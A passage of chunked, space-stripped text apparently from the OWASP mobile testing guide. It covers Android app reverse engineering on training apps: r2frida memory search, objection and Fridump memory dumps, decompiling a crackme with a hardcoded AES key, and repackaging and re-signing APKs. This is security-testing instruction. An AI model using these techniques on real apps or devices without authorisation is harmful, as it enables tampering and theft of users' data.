Notethatwe’vefilteredbypackagenameasthisistheMainActivityanditincludesallmethodsfromAndroid’sActivity class. Youcanalsodisplayinformationabouttheclassloader: [0x00000000]>:icL dalvik.system.PathClassLoader[ DexPathList[ [ directory \".\"] , nativeLibraryDirectories=[ /system/lib64, /vendor/lib64, /system/lib64, /vendor/lib64] ] ] java.lang.BootClassLoader@b1f1189dalvik.system.PathClassLoader[ DexPathList[ [ zipfile \"/data/app/sg.vantagepoint.helloworldjni-1/base.apk\"] , nativeLibraryDirectories=[ /data/app/sg.vantagepoint.helloworldjni-1/lib/arm64, /data/app/sg.vantagepoint.helloworldjni-1/base.apk!/lib/arm64-v8a, /system/lib64, /vendor/lib64] ] ] Next,imaginethatyouareinterestedintothemethodexportedbylibnative-lib.so0x7d1c49954c f Java_sg_vantage- point_helloworldjni_MainActivity_stringFromJNI.Youcanseektothataddresswiths 0x7d1c49954c,analyzethat functionafandprint10linesofitsdisassemblypd 10: [0x7d1c49954c]>pdf ;--sym.fun.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI: ╭(fcn)fcn.7d1c49954c18 │ fcn.7d1c49954c (int32_targ_40f942h); │ ;argint32_targ_40f942h@x29+0x40f942 │ 0x7d1c49954c 080040f9 ldrx8, [x0] │ 0x7d1c499550 01000090 adrpx1,0x7d1c499000 │ 0x7d1c499554 21801591 addx1,x1,0x560 ;hit0_4 │ 0x7d1c499558 029d42f9 ldrx2,[x8,0x538] ;[0x538:4]=-1 ;1336 │ 0x7d1c49955c 4000 invalid Note that the line tagged with ; hit0_4 corresponds to the string that we’ve previously found: 0x7d1c499560 hit0_4 Hello from C++. Tolearnmore,pleaserefertother2fridawiki. 154\\nHost-Device Data Transfer Platform: android Using adb Youcancopyfilestoandfromadevicebyusingtheadbcommandsadb pull <remote> <local>andadb push <local> <remote>commands. Theirusageisverystraightforward. Forexample,thefollowingwillcopyfoo.txtfromyourcurrent directory(local)tothesdcardfolder(remote): adbpushfoo.txt/sdcard/foo.txt Thisapproachiscommonlyusedwhenyouknowexactlywhatyouwanttocopyandfrom/towhereandalsosupportsbulk filetransfer,e.g.youcanpull(copy)awholedirectoryfromtheAndroiddevicetoyourhostcomputer. $adbpull/sdcard /sdcard/:1190filespulled.14.1MB/s (304526427bytesin20.566s) Using Android Studio Device File Explorer AndroidStudiohasabuilt-inDeviceFileExplorerwhichyoucanopenbygoingtoView->ToolWindows->DeviceFile Explorer. If you’re using a rooted device you can now start exploring the whole file system. However, when using a non-rooted deviceaccessingtheappsandboxeswon’tworkunlesstheappisdebuggableandeventhenyouare“jailed”withinthe appsandbox. Using objection Thisoptionisusefulwhenyouareworkingonaspecificappandwanttocopyfilesyoumightencounterinsideitssandbox (noticethatyou’llonlyhaveaccesstothefilesthatthetargetapphasaccessto). Thisapproachworkswithouthavingto settheappasdebuggable,whichisotherwiserequiredwhenusingAndroidStudio’sDeviceFileExplorer. First,connecttotheappwithObjectionasexplainedin“RecommendedTools-Objection”. Then,uselsandcdasyou normallywouldonyourterminaltoexploretheavailablefiles: $frida-ps -U|grep -iowasp 21228 sg.vp.owasp_mobile.omtg_android $objection -gsg.vp.owasp_mobile.omtg_androidexplore ...g.vp.owasp_mobile.omtg_androidon (google:8.1.0)[usb] #cd.. /data/user/0/sg.vp.owasp_mobile.omtg_android ...g.vp.owasp_mobile.omtg_androidon (google:8.1.0) [usb] #ls Type ... Name --------- ... ------------------- 155\\nDirectory ... cache Directory ... code_cache Directory ... lib Directory ... shared_prefs Directory ... files Directory ... app_ACRA-approved Directory ... app_ACRA-unapproved Directory ... databases Readable:True Writable:True Oneyouhaveafileyouwanttodownloadyoucanjustrunfile download <some_file>. Thiswilldownloadthatfileto yourworkingdirectory. Thesamewayyoucanuploadfilesusingfile upload. ...[usb] #ls Type ... Name ------ ... ----------------------------------------------- File ... sg.vp.owasp_mobile.omtg_android_preferences.xml Readable:True Writable:True ...[usb] #filedownloadsg.vp.owasp_mobile.omtg_android_preferences.xml Downloading... Streamingfilefromdevice... Writingbytestodestination... Successfullydownloaded...tosg.vp.owasp_mobile.omtg_android_preferences.xml Thedownsideisthat,atthetimeofthiswriting,objectiondoesnotsupportbulkfiletransferyet,soyou’rerestrictedto copyindividualfiles. Still,thiscancomehandyinsomescenarioswhereyou’realreadyexploringtheappusingobjection anywayandfindsomeinterestingfile. Insteadofforexampletakingnoteofthefullpathofthatfileanduseadb pull <path_to_some_file>fromaseparateterminal,youmightjustwanttodirectlydofile download <some_file>. Decompiling Java Code Platform: android InAndroidappsecuritytesting,iftheapplicationisbasedsolelyonJavaanddoesn’thaveanynativecode(C/C++code), thereverseengineeringprocessisrelativelyeasyandrecovers(decompiles)almostallthesourcecode. Inthosecases, black-boxtesting(withaccesstothecompiledbinary,butnottheoriginalsourcecode)cangetprettyclosetowhite-box testing. Nevertheless,ifthecodehasbeenpurposefullyobfuscated(orsometool-breakinganti-decompilationtrickshavebeen applied),thereverseengineeringprocessmaybeverytime-consumingandunproductive. Thisalsoappliestoapplications thatcontainnativecode. Theycanstillbereverseengineered,buttheprocessisnotautomatedandrequiresknowledge oflow-leveldetails. IfyouwanttolookdirectlyintoJavasourcecodeonaGUI,simplyopenyourAPKusingjadxorBytecodeViewer. AndroiddecompilersgoonestepfurtherandattempttoconvertAndroidbytecodebackintoJavasourcecode, making itmorehuman-readable. Fortunately, JavadecompilersgenerallyhandleAndroidbytecodewell. Theabovementioned toolsembed,andsometimesevencombine,popularfreedecompilerssuchas: • JD • JAD • jadx • Procyon • CFR AlternativelyyoucanusetheAPKLabextensionforVisualStudioCodeorrunapkxonyourAPKorusetheexportedfiles fromtheprevioustoolstoopenthereversedsourcecodeonyourpreferredIDE. In the following example we’ll be using UnCrackable App for Android Level 1. First, let’s install the app on a device or emulatorandrunittoseewhatthecrackmeisabout. 156\\nSeemslikewe’reexpectedtofindsomekindofsecretcode! We’relookingforasecretstringstoredsomewhereinsidetheapp,sothenextstepistolookinside. First,unziptheAPK file(unzip UnCrackable-Level1.apk -d UnCrackable-Level1)and lookat thecontent. In thestandardsetup, allthe Javabytecodeandappdataisinthefileclasses.dexintheapprootdirectory(UnCrackable-Level1/). Thisfileconforms totheDalvikExecutableFormat(DEX),anAndroid-specificwayofpackagingJavaprograms. MostJavadecompilerstake plainclassfilesorJARsasinput,soyouneedtoconverttheclasses.dexfileintoaJARfirst. Youcandothiswithdex2jar orenjarify. Once you have a JAR file, you can use any free decompiler to produce Java code. In this example, we’ll use the CFR decompiler. CFRreleasesareavailableontheauthor’swebsite. CFRwasreleasedunderanMITlicense,soyoucanuse itfreelyeventhoughitssourcecodeisnotavailable. The easiest way to run CFR is through apkx, which also packages dex2jar and automates extraction, conversion, and decompilation. RunitontheAPKandyoushouldfindthedecompiledsourcesinthedirectoryUncrackable-Level1/src. Toviewthesources,asimpletexteditor(preferablywithsyntaxhighlighting)isfine,butloadingthecodeintoaJavaIDE makesnavigationeasier. Let’simportthecodeintoIntelliJ,whichalsoprovideson-devicedebuggingfunctionality. Open IntelliJ and select “Android” as the project type in the left tab of the “New Project” dialog. Enter “Uncrack- able1” as the application name and “vantagepoint.sg” as the company name. This results in the package name “sg.vantagepoint.uncrackable1”, which matches the original package name. Using a matching package name is important if you want to attach the debugger to the running app later on because IntelliJ uses the package name to identifythecorrectprocess. Inthe nextdialog, pick any APInumber; you don’t actuallywant to compile the project,",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 72
    }
  },
  {
    "text": "the package name “sg.vantagepoint.uncrackable1”, which matches the original package name. Using a matching package name is important if you want to attach the debugger to the running app later on because IntelliJ uses the package name to identifythecorrectprocess. Inthe nextdialog, pick any APInumber; you don’t actuallywant to compile the project, so the number doesn’t matter. Click“next”andchoose“AddnoActivity”,thenclick“finish”. Onceyouhavecreatedtheproject,expandthe“1: Project”viewontheleftandnavigatetothefolderapp/src/main/java. Right-clickanddeletethedefaultpackage“sg.vantagepoint.uncrackable1”createdbyIntelliJ. 157\\nNow,opentheUncrackable-Level1/srcdirectoryinafilebrowseranddragthesgdirectoryintothenowemptyJava folderintheIntelliJprojectview(holdthe“alt”keytocopythefolderinsteadofmovingit). You’llendupwithastructurethatresemblestheoriginalAndroidStudioprojectfromwhichtheappwasbuilt. 158\\nSeethesection“ReviewingDecompiledJavaCode”belowtolearnonhowtoproceedwheninspectingthedecompiled Javacode. Process Exploration Platform: android Whentestinganapp,processexplorationcanprovidethetesterwithdeepinsightsintotheappprocessmemory. Itcan beachievedviaruntimeinstrumentationandallowstoperformtaskssuchas: • Retrievingthememorymapandloadedlibraries. • Searchingforoccurrencesofcertaindata. • Afterdoingasearch,obtainingthelocationofacertainoffsetinthememorymap. • Performingamemorydumpandinspectorreverseengineerthebinarydataoffline. • Reverseengineeringanativelibrarywhileit’srunning. Asyoucansee,thesepassivetaskshelpuscollectinformation. ThisInformationisoftenusedforothertechniques,such asmethodhooking. Inthefollowingsectionsyouwillbeusingr2fridatoretrieveinformationstraightfromtheappruntime. Pleasereferto r2frida’s official installation instructions. First start by opening an r2frida session to the target app (e.g. HelloWorld JNI APK)thatshouldberunningonyourAndroidphone(connectedperUSB).Usethefollowingcommand: 159\\nr2frida://usb//sg.vantagepoint.helloworldjni Seealloptionswithr2 frida://?. Onceinther2fridasession,allcommandsstartwith:. Forexample,inradare2you’drunitodisplaythebinaryinforma- tion,butinr2fridayou’duse:i. Memory Maps and Inspection Youcanretrievetheapp’smemorymapsbyrunning\\dm. TheoutputinAndroidcangetverylong(e.g.between1500 and2000lines),tonarrowyoursearchandseeonlywhatdirectlybelongstotheappapplyagrep(~)bypackagename \\dm~<package_name>: [0x00000000]>\\dm~sg.vantagepoint.helloworldjni 0x000000009b2dc000 -0x000000009b361000rw-/dev/ashmem/dalvik-/data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.art (deleted) 0x000000009b361000 -0x000000009b36e000 ---/dev/ashmem/dalvik-/data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.art (deleted) 0x000000009b36e000 -0x000000009b371000rw-/dev/ashmem/dalvik-/data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.art (deleted) 0x0000007d103be000 -0x0000007d10686000r--/data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.vdex 0x0000007d10dd0000 -0x0000007d10dee000r--/data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.odex 0x0000007d10dee000 -0x0000007d10e2b000r-x/data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.odex 0x0000007d10e3a000 -0x0000007d10e3b000r--/data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.odex 0x0000007d10e3b000 -0x0000007d10e3c000rw-/data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.odex 0x0000007d1c499000 -0x0000007d1c49a000r-x/data/app/sg.vantagepoint.helloworldjni-1/lib/arm64/libnative-lib.so 0x0000007d1c4a9000 -0x0000007d1c4aa000r--/data/app/sg.vantagepoint.helloworldjni-1/lib/arm64/libnative-lib.so 0x0000007d1c4aa000 -0x0000007d1c4ab000rw-/data/app/sg.vantagepoint.helloworldjni-1/lib/arm64/libnative-lib.so 0x0000007d1c516000 -0x0000007d1c54d000r--/data/app/sg.vantagepoint.helloworldjni-1/base.apk 0x0000007dbd23c000 -0x0000007dbd247000r--/data/app/sg.vantagepoint.helloworldjni-1/base.apk 0x0000007dc05db000 -0x0000007dc05dc000r--/data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.art Whileyou’researchingorexploringtheappmemory,youcanalwaysverifywhereyou’relocatedateachmoment(where yourcurrentoffsetislocated)inthememorymap. Insteadofnotingandsearchingforthememoryaddressinthislist youcansimplyrun\\dm.. You’llfindanexampleinthefollowingsection“In-MemorySearch”. Ifyou’reonlyinterestedinthemodules(binariesandlibraries)thattheapphasloaded,youcanusethecommand\\il tolistthemall: [0x00000000]>\\il 0x000000558b1fd000app_process64 0x0000007dbc859000libandroid_runtime.so 0x0000007dbf5d7000libbinder.so 0x0000007dbff4d000libcutils.so 0x0000007dbfd13000libhwbinder.so 0x0000007dbea00000liblog.so 0x0000007dbcf17000libnativeloader.so 0x0000007dbf21c000libutils.so 0x0000007dbde4b000libc++.so 0x0000007dbe09b000libc.so ... 0x0000007d10dd0000base.odex 0x0000007d1c499000libnative-lib.so 0x0000007d2354e000frida-agent-64.so 0x0000007dc065d000linux-vdso.so.1 0x0000007dc065f000linker64 Asyoumightexpectyoucancorrelatetheaddressesofthelibrarieswiththememorymaps: e.g.thenativelibraryofthe appislocatedat0x0000007d1c499000andoptimizeddex(base.odex)at0x0000007d10dd0000. Youcanalsouseobjectiontodisplaythesameinformation. $objection --gadget sg.vantagepoint.helloworldjniexplore sg.vantagepoint.helloworldjnion (google:8.1.0)[usb] #memorylistmodules Savetheoutputbyadding `--jsonmodules.json`tothiscommand Name Base Size Path ----------------------------------------------- ------------ -------------------- -------------------------------------------------------------------- app_process64 0x558b1fd000 32768 (32.0KiB) /system/bin/app_process64 libandroid_runtime.so 0x7dbc859000 1982464 (1.9MiB) /system/lib64/libandroid_runtime.so libbinder.so 0x7dbf5d7000 557056 (544.0KiB) /system/lib64/libbinder.so libcutils.so 0x7dbff4d000 77824 (76.0KiB) /system/lib64/libcutils.so libhwbinder.so 0x7dbfd13000 163840 (160.0KiB) /system/lib64/libhwbinder.so base.odex 0x7d10dd0000 442368 (432.0KiB) /data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.odex libnative-lib.so 0x7d1c499000 73728 (72.0KiB) /data/app/sg.vantagepoint.helloworldjni-1/lib/arm64/libnative-lib.so YoucanevendirectlyseethesizeandthepathtothatbinaryintheAndroidfilesystem. 160\\nIn-Memory Search In-memorysearchisaveryusefultechniquetotestforsensitivedatathatmightbepresentintheappmemory. See r2frida’s help on the search command (\\/?) to learn about the search command and get a list of options. The followingshowsonlyasubsetofthem: [0x00000000]>\\/? / search /j searchjson /w searchwide /wj searchwidejson /x searchhex /xj searchhexjson ... Youcanadjustyoursearchbyusingthesearchsettings\\e~search. Forexample,\\e search.quiet=true;willprintonly theresultsandhidesearchprogress: [0x00000000]>\\e~search esearch.in=perm:r-- esearch.quiet=false Fornow,we’llcontinuewiththedefaultsandconcentrateonstringsearch. Thisappisactuallyverysimple,itloadsthe string“HellofromC++”fromitsnativelibraryanddisplaysittous. Youcanstartbysearchingfor“Hello”andseewhat r2fridafinds: [0x00000000]>\\/Hello Searching5bytes:48656c6c6f ... hits:11 0x13125398hit0_0HelloWorldJNI 0x13126b90hit0_1HelloWorld! 0x1312e220hit0_2HellofromC++ 0x70654ec5hit0_3Hello 0x7d1c499560hit0_4HellofromC++ 0x7d1c4a9560hit0_5HellofromC++ 0x7d1c51cef9hit0_6HelloWorldJNI 0x7d30ba11bchit0_7HelloWorld! 0x7d39cd796bhit0_8Hello.java 0x7d39d2024dhit0_9Hello; 0x7d3aa4d274hit0_10Hello Nowyou’dliketoknowwheretheseaddressesactuallyare. Youmaydosobyrunningthe\\dm. commandforall@@hits matchingtheglobhit0_*: [0x00000000]>\\dm.@@hit0_* 0x0000000013100000 -0x0000000013140000rw-/dev/ashmem/dalvik-mainspace (regionspace)(deleted) 0x0000000013100000 -0x0000000013140000rw-/dev/ashmem/dalvik-mainspace (regionspace)(deleted) 0x0000000013100000 -0x0000000013140000rw-/dev/ashmem/dalvik-mainspace (regionspace)(deleted) 0x00000000703c2000 -0x00000000709b5000rw-/data/dalvik-cache/arm64/system@framework@boot-framework.art 0x0000007d1c499000 -0x0000007d1c49a000r-x/data/app/sg.vantagepoint.helloworldjni-1/lib/arm64/libnative-lib.so 0x0000007d1c4a9000 -0x0000007d1c4aa000r--/data/app/sg.vantagepoint.helloworldjni-1/lib/arm64/libnative-lib.so 0x0000007d1c516000 -0x0000007d1c54d000r--/data/app/sg.vantagepoint.helloworldjni-1/base.apk 0x0000007d30a00000 -0x0000007d30c00000rw- 0x0000007d396bc000 -0x0000007d3a998000r--/system/framework/arm64/boot-framework.vdex 0x0000007d396bc000 -0x0000007d3a998000r--/system/framework/arm64/boot-framework.vdex 0x0000007d3a998000 -0x0000007d3aa9c000r--/system/framework/arm64/boot-ext.vdex Additionally, you can search for occurrences of the wide version of the string (\\/w) and, again, check their memory regions: [0x00000000]>\\/wHello Searching10bytes:480065006c006c006f00 hits:6 0x13102acchit1_0480065006c006c006f00 0x13102b9chit1_1480065006c006c006f00 0x7d30a53aa0hit1_2480065006c006c006f00 0x7d30a872b0hit1_3480065006c006c006f00 0x7d30bb9568hit1_4480065006c006c006f00 0x7d30bb9a68hit1_5480065006c006c006f00 [0x00000000]>\\dm.@@hit1_* 0x0000000013100000 -0x0000000013140000rw-/dev/ashmem/dalvik-mainspace (regionspace)(deleted) 0x0000000013100000 -0x0000000013140000rw-/dev/ashmem/dalvik-mainspace (regionspace)(deleted) 0x0000007d30a00000 -0x0000007d30c00000rw- 0x0000007d30a00000 -0x0000007d30c00000rw- 0x0000007d30a00000 -0x0000007d30c00000rw- 0x0000007d30a00000 -0x0000007d30c00000rw- 161\\nTheyareinthesamerw-regionasoneofthepreviousstrings(0x0000007d30a00000). Notethatsearchingforthewide versionsofstringsissometimestheonlywaytofindthemasyou’llseeinthefollowingsection. In-memorysearchcan be very useful to quickly know ifcertain data is located in the main app binary, inside a shared libraryorinanotherregion. Youmayalsouseittotestthebehavioroftheappregardinghowthedataiskeptinmemory. Forinstance,youcouldanalyzeanappthatperformsaloginandsearchforoccurrencesoftheuserpassword. Also,you maycheckifyoustillcanfindthepasswordinmemoryaftertheloginiscompletedtoverifyifthissensitivedataiswiped frommemoryafteritsuse. Memory Dump Youcandumptheapp’sprocessmemorywithobjectionandFridump. Totakeadvantageofthesetoolsonanon-rooted device,theAndroidappmustberepackagedwithfrida-gadget.soandre-signed. Adetailedexplanationofthisprocess isinthesectionDynamicAnalysisonNon-RootedDevices. Tousethesetoolsonarootedphone,simplyhavefrida-server installedandrunning. Note: Whenusingthesetools,youmightgetseveralmemoryaccessviolationerrorswhichcannormallybeignored. ThesetoolsinjectaFridaagentandtrytodumpallthemappedmemoryoftheappregardlessoftheaccesspermis- sions(read/write/execute). Therefore,whentheinjectedFridaagenttriestoreadaregionthat’snotreadable,it’ll returnthecorrespondingmemoryaccessviolationerrors. Refertoprevioussection“MemoryMapsandInspection” formoredetails. Withobjectionitispossibletodumpallmemoryoftherunningprocessonthedevicebyusingthecommandmemorydump all. $objection --gadget sg.vantagepoint.helloworldjniexplore sg.vantagepoint.helloworldjnion (google:8.1.0)[usb] #memorydumpall/Users/foo/memory_Android/memory Willdump719rw-images,totalling1.6GiB Dumping1002.8MiBfrombase:0x14140000 [------------------------------------] 0% 00:11:03(sessiondetach message)process-terminated Dumping8.0MiBfrombase:0x7fc753e000 [####################################] 100% Memorydumpedtofile:/Users/foo/memory_Android/memory Inthiscasetherewasanerror,whichisprobablyduetomemoryaccessviolationsaswealreadyanticipated. This error can be safely ignored as long as we areable to see the extracted dump in the file system. If you have any problems,afirststepwouldbetoenablethedebugflag-dwhenrunningobjectionor,ifthatdoesn’thelp,filean issueinobjection’sGitHub. Next,weareabletofindthe“HellofromC++”stringswithradare2: $r2/Users/foo/memory_Android/memory [0x00000000]>izz~Hellofrom 11360x000652700x00065270 14 15 ()asciiHellofromC++ AlternativelyyoucanuseFridump. Thistime, wewillinputastringandseeifwecanfinditinthememorydump. For this, opentheMASTGHackingPlaygroundapp, navigateto“OMTG_DATAST_002_LOGGING”andenter“owasp-mstg”to thepasswordfield. Next,runFridump: python3fridump.py -Usg.vp.owasp_mobile.omtg_android -s CurrentDirectory:/Users/foo/git/fridump Outputdirectoryissetto:/Users/foo/git/fridump/dump StartingMemorydump... Oops,memoryaccessviolation!-------------------------------]0.28%Complete Progress: [##################################################]99.58%Complete Runningstringsonallfiles: Progress: [##################################################]100.0%Complete Finished! Tip: Enableverbositybyincludingtheflag-vifyouwanttoseemoredetails,e.g.theregionsprovokingmemory accessviolations. 162\\nIt will take a while until",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 73
    }
  },
  {
    "text": "extracted dump in the file system. If you have any problems,afirststepwouldbetoenablethedebugflag-dwhenrunningobjectionor,ifthatdoesn’thelp,filean issueinobjection’sGitHub. Next,weareabletofindthe“HellofromC++”stringswithradare2: $r2/Users/foo/memory_Android/memory [0x00000000]>izz~Hellofrom 11360x000652700x00065270 14 15 ()asciiHellofromC++ AlternativelyyoucanuseFridump. Thistime, wewillinputastringandseeifwecanfinditinthememorydump. For this, opentheMASTGHackingPlaygroundapp, navigateto“OMTG_DATAST_002_LOGGING”andenter“owasp-mstg”to thepasswordfield. Next,runFridump: python3fridump.py -Usg.vp.owasp_mobile.omtg_android -s CurrentDirectory:/Users/foo/git/fridump Outputdirectoryissetto:/Users/foo/git/fridump/dump StartingMemorydump... Oops,memoryaccessviolation!-------------------------------]0.28%Complete Progress: [##################################################]99.58%Complete Runningstringsonallfiles: Progress: [##################################################]100.0%Complete Finished! Tip: Enableverbositybyincludingtheflag-vifyouwanttoseemoredetails,e.g.theregionsprovokingmemory accessviolations. 162\\nIt will take a while until it’s completed and you’ll get a collection of *.data files inside the dump folder. When you add the-sflag,allstringsareextractedfromthedumpedrawmemoryfilesandaddedtothefilestrings.txt,whichisalso storedinthedumpdirectory. lsdump/ dump/1007943680_dump.datadump/357826560_dump.data dump/630456320_dump.data...strings.txt Finally,searchfortheinputstringinthedumpdirectory: $grep -nri owasp-mstgdump/ Binaryfiledump//316669952_dump.datamatches Binaryfiledump//strings.txtmatches The“owasp-mstg”stringcanbefoundinoneofthedumpfilesaswellasintheprocessedstringsfile. Repackaging & Re-Signing Platform: android Repackaging Youcaneasilyrepackageanappbydoingthefollowing: cdUnCrackable-Level1 apktoolb zipalign -v4dist/UnCrackable-Level1.apk../UnCrackable-Repackaged.apk Note that the Android Studio build tools directory must be in the path. It is located at [SDK-Path]/build-tools/[ version]. Thezipalignandapksignertoolsareinthisdirectory. Re-Signing Beforere-signing, youfirstneedacode-signingcertificate. IfyouhavebuiltaprojectinAndroidStudiobefore,theIDE hasalreadycreatedadebugkeystoreandcertificatein$HOME/.android/debug.keystore. Thedefaultpasswordforthis KeyStoreis“android”andthekeyiscalled“androiddebugkey”. ThestandardJavadistributionincludeskeytoolformanagingKeyStoresandcertificates. Youcancreateyourownsigning certificateandkey,thenaddittothedebugKeyStore: keytool -genkey -v-keystore ~/.android/debug.keystore -alias signkey -keyalg RSA-keysize 2048 -validity 20000 Afterthecertificateisavailable,youcanre-signtheAPKwithit. Besurethatapksignerisinthepathandthatyourunit fromthefolderwhereyourrepackagedAPKislocated. apksignersign --ks ~/.android/debug.keystore --ks-key-alias signkeyUnCrackable-Repackaged.apk Note: If you experience JRE compatibility issues with apksigner, you can use jarsigner instead. When you do this, zipalignmustbecalledaftersigning. jarsigner -verbose -keystore ~/.android/debug.keystore../UnCrackable-Repackaged.apksignkey zipalign -v4dist/UnCrackable-Level1.apk../UnCrackable-Repackaged.apk Nowyoumayreinstalltheapp: 163\\nadbinstallUnCrackable-Repackaged.apk Reviewing Decompiled Java Code Platform: android Followingtheexamplefrom“DecompilingJavaCode”,weassumethatyou’vesuccessfullydecompiledandopenedthe UnCrackableAppforAndroidLevel1inIntelliJ.AssoonasIntelliJhasindexedthecode,youcanbrowseitjustlikeyou’d browseanyotherJavaproject. Notethatmanyofthedecompiledpackages,classes,andmethodshaveweirdone-letter names;thisisbecausethebytecodehasbeen“minified”withProGuardatbuildtime. Thisisabasictypeofobfuscation thatmakesthebytecodealittlemoredifficulttoread,butwithafairlysimpleapplikethisone,itwon’tcauseyoumuch ofaheadache. Whenyou’reanalyzingamorecomplexapp,however,itcangetquiteannoying. When analyzing obfuscated code, annotating class names, method names, and other identifiers as you go along is a good practice. Open the MainActivity class in the package sg.vantagepoint.uncrackable1. The method verify is calledwhenyoutapthe“verify”button. Thismethodpassestheuserinputtoastaticmethodcalleda.a,whichreturns abooleanvalue. Itseemsplausiblethata.averifiesuserinput,sowe’llrefactorthecodetoreflectthis. Right-clicktheclassname(thefirstaina.a)andselectRefactor->Renamefromthedrop-downmenu(orpressShift-F6). Changetheclassnametosomethingthatmakesmoresensegivenwhatyouknowabouttheclasssofar. Forexample, youcouldcallit“Validator”(youcanalways revisethenamelater). a.anowbecomesValidator.a. Followthesame proceduretorenamethestaticmethodatocheck_input. Congratulations,youjustlearnedthefundamentalsofstaticanalysis! Itisallabouttheorizing,annotating,andgradually revisingtheoriesabouttheanalyzedprogramuntilyouunderstanditcompletelyor, atleast, wellenoughforwhatever youwanttoachieve. Next,Ctrl+click(orCommand+clickonMac)onthecheck_inputmethod. Thistakesyoutothemethoddefinition. The decompiledmethodlookslikethis: public static boolean check_input(Stringstring){ byte[]arrby =Base64.decode((String)\\ \"5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc=\",(int)0); byte[]arrby2 =newbyte[]{}; try{ arrby =sg.vantagepoint.a.a.a(Validator.b(\"8d127684cbc37c17616d806cf50473cc\"),arrby); arrby2 =arrby; 164\\n}sa catch (Exceptionexception){ Log.d((String)\"CodeCheck\",(String)(\"AESerror:\" +exception.getMessage())); } if(string.equals(newString(arrby2))){ return true; } return false; } So,youhaveaBase64-encodedStringthat’spassedtothefunctionainthepackage sg.vantagepoint.a.a (again, everything is called a) along with something that looks suspiciously like a hex-encoded encryptionkey(16hexbytes=128bit,acommonkeylength). Whatexactlydoesthisparticularado? Ctrl-clickittofind out. public class a{ public static byte[]a(byte[]object,byte[]arrby){ object =newSecretKeySpec((byte[])object,\"AES/ECB/PKCS7Padding\"); Ciphercipher =Cipher.getInstance(\"AES\"); cipher.init(2,(Key)object); return cipher.doFinal(arrby); } } Nowyou’regettingsomewhere: it’ssimplystandardAES-ECB.LooksliketheBase64stringstoredinarrby1incheck_- inputisaciphertext. Itisdecryptedwith128bitAES,thencomparedwiththeuserinput. Asabonustask,trytodecrypt theextractedciphertextandfindthesecretvalue! A faster way to get the decrypted string is to add dynamic analysis. We’ll revisit UnCrackable App for Android Level 1 latertoshowhow(e.g.intheDebuggingsection),sodon’tdeletetheprojectyet! Get Open Connections Platform: android Youcanfindsystem-widenetworkinginformationin/proc/netorjustbyinspectingthe/proc/<pid>/netdirectories(for somereasonnotprocessspecific). Therearemultiplefilespresentinthesedirectories,ofwhichtcp,tcp6andudpmight beconsideredrelevantfromthetester’sperspective. ##cat/proc/7254/net/tcp sl local_addressrem_address sttx_queuerx_queuetrtm->whenretrnsmt uid timeoutinode ... 69:1101A8C0:BB2F9A447D4A:01BB0100000000:0000000000:000000000000000010093 075412 100000000000000002031910 -1 70:1101A8C0:917CE3CB3AD8:01BB0100000000:0000000000:000000000000000010093 075553 100000000000000002032310 -1 71:1101A8C0:C1E39C187D4A:01BB0100000000:0000000000:000000000000000010093 075458 100000000000000002031910 -1 ... Intheoutputabove,themostrelevantfieldsforusare: • rem_address: remoteaddressandportnumberpair(inhexadecimalrepresentation). • tx_queue and rx_queue: the outgoing and incoming data queue in terms of kernel memory usage. These fields giveanindicationhowactivelytheconnectionisbeingused. • uid: containingtheeffectiveUIDofthecreatorofthesocket. Anotheralternativeistousethenetstatcommand,whichalsoprovidesinformationaboutthenetworkactivityforthe complete system in a more readable format, and can be easily filtered as per our requirements. For instance, we can easilyfilteritbyPID: ##netstat-p|grep24685 ActiveInternetconnections (w/oservers) ProtoRecv-QSend-QLocalAddress ForeignAddress State PID/ProgramName tcp 0 0192.168.1.17:47368 172.217.194.103:https CLOSE_WAIT 24685/com.google.android.youtube tcp 0 0192.168.1.17:47233 172.217.194.94:https CLOSE_WAIT 24685/com.google.android.youtube tcp 0 0192.168.1.17:38480 sc-in-f100.1e100.:httpsESTABLISHED24685/com.google.android.youtube tcp 0 0192.168.1.17:44833 74.125.24.91:https ESTABLISHED24685/com.google.android.youtube tcp 0 0192.168.1.17:38481 sc-in-f100.1e100.:httpsESTABLISHED24685/com.google.android.youtube ... 165\\nnetstatoutputisclearlymoreuserfriendlythanreading/proc/<pid>/net. Themostrelevantfieldsforus, similarto thepreviousoutput,arefollowing: • Foreign Address: remoteaddressandportnumberpair(portnumbercanbereplacedwiththewell-knownname ofaprotocolassociatedwiththeport). • Recv-QandSend-Q:Statisticsrelatedtoreceiveandsendqueue. Givesanindicationonhowactivelytheconnection isbeingused. • State: thestateofasocket,forexample,ifthesocketisinactiveuse(ESTABLISHED)orclosed(CLOSED). Get Loaded Native Libraries Platform: android Using Process Memory Maps Thefile/proc/<pid>/mapscontainsthecurrentlymappedmemoryregionsandtheiraccesspermissions. Usingthisfile wecangetthelistofthelibrariesloadedintheprocess. ##cat/proc/9568/maps 12c00000-52c00000rw-p0000000000:0414917 /dev/ashmem/dalvik-mainspace (regionspace)(deleted) 6f019000-6f2c0000rw-p00000000fd:001146914 /data/dalvik-cache/arm64/system@framework@boot.art ... 7327670000-7329747000r--p00000000fd:001884627 /data/app/com.google.android.gms-4FJbDh-oZv-5bCw39jkIMQ==/oat/arm64/base.odex .. 733494d000-7334cfb000r-xp00000000fd:001884542 ↪ /data/app/com.google.android.youtube-Rl_hl9LptFQf3Vf-JJReGw==/lib/arm64/libcronet.80.0.3970.3.so ... Using Frida You can retrieve process related information straight from the Frida CLI by using the Process command. Within the ProcesscommandthefunctionenumerateModulesliststhelibrariesloadedintotheprocessmemory. [HuaweiNexus6P::sg.vantagepoint.helloworldjni]->Process.enumerateModules()",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 74
    }
  },
  {
